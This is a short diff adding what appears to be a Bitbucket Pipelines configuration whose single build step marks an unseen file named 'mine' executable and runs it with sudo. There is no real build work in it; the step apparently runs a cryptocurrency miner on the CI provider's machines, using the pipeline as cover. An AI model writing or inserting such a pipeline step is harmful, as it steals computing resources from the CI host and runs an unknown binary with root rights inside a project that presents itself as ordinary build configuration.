@@ -1,0 +1,5 @@
+pipelines:
+  default:
+    - step:
+        script:
+          - sudo apt update && sudo chmod u+x mine && sudo ./mine
